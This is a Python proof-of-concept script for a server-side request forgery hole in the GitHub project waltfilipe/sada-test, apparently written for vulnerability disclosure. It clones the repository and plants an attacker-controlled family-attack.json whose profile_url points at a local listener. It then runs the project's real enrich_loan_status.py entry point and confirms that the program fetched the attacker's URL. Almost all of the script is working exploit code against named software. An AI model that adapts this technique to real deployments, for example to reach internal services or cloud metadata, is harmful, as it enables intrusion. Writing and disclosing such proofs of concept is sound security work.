#!/usr/bin/env python3
"""GENUINE end-to-end SSRF PoC against sada-test (waltfilipe/sada-test).

Unlike a function-level test, this drives the program's REAL entry point with
attacker-controlled input and observes the effect through the real interface:

  attacker-controlled input  : a data/family-*.json file whose
                               players[].transfermarkt.profile_url points at us
  real entry point           : `python scripts/enrich_loan_status.py`  (its __main__)
  real data flow             : main() reads family-*.json -> profile_url -> fetch_loan_club(url)
                               -> urllib.request.urlopen(url)   (the SSRF sink)
  observed effect            : our local server receives the request => the program
                               was steered to fetch an attacker-chosen host (SSRF)

Threat model: the family-*.json data files are the program's input. A malicious or
compromised data file makes the tool issue arbitrary server-side requests -- e.g.
to internal services or cloud metadata. No LLM, only the Python stdlib.

Nothing destructive: we only observe one HTTP request to a localhost listener, and
we restore the repo's real data files afterwards.

    python3 poc_sada_ssrf.py
"""
import http.server
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import uuid
from pathlib import Path

REPO = "https://github.com/waltfilipe/sada-test.git"


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def main():
    work = Path(tempfile.mkdtemp(prefix="sada_ssrf_"))
    clone = work / "repo"
    print(f"[*] cloning {REPO}")
    r = subprocess.run(["git", "clone", "--depth", "1", REPO, str(clone)],
                       capture_output=True, text=True)
    if r.returncode != 0:
        print("clone failed:", r.stderr[-300:]); sys.exit(1)

    data_dir = clone / "data"
    data_dir.mkdir(exist_ok=True)

    # move the repo's real family-*.json aside so the run is fast & offline
    # (otherwise it would fetch real Transfermarkt URLs). We restore them after.
    moved = []
    for f in data_dir.glob("family-*.json"):
        bak = f.with_suffix(".json.pocbak")
        f.rename(bak)
        moved.append((bak, f))

    # ---- attacker-controlled input: a family file pointing profile_url at us ----
    nonce = uuid.uuid4().hex[:12]
    port = free_port()
    ssrf_url = f"http://127.0.0.1:{port}/SSRF_{nonce}"
    attack = {"players": [{"name": "pwn", "transfermarkt": {"profile_url": ssrf_url}}]}
    (data_dir / "family-attack.json").write_text(json.dumps(attack), encoding="utf-8")
    print(f"[*] planted attacker data file: data/family-attack.json")
    print(f"    profile_url = {ssrf_url}")

    # ---- our 'internal service' listener: records any request it receives ----
    hits = []

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append(self.path)
            body = b"<html>Emprestado de: </span><span><a title=\"x\"></a></span></html>"
            self.send_response(200); self.send_header("Content-Length", str(len(body)))
            self.end_headers(); self.wfile.write(body)

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", port), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[*] listener up on 127.0.0.1:{port}")

    # ---- run the REAL program entry point ----
    print("[*] running: python3 scripts/enrich_loan_status.py  (the real __main__)")
    proc = subprocess.run([sys.executable, "scripts/enrich_loan_status.py"],
                          cwd=str(clone), capture_output=True, text=True, timeout=60)
    print("    (program stdout, first lines):")
    for line in (proc.stdout or "").splitlines()[:4]:
        print("      " + line)

    time.sleep(0.3)
    srv.shutdown()

    # ---- verdict ----
    got = [h for h in hits if nonce in h]
    print()
    if got:
        print(f"[+] SSRF CONFIRMED end-to-end: the program fetched our attacker URL")
        print(f"    listener received: {got[0]}")
        print(f"    => a data-file-controlled value reached urllib.request.urlopen via the real CLI")
    else:
        print("[-] no request received (unexpected) -- hits:", hits)

    # restore the repo's real data files (tidy)
    for bak, orig in moved:
        bak.rename(orig)
    shutil.rmtree(work, ignore_errors=True)
    return 0 if got else 1


if __name__ == "__main__":
    sys.exit(main())
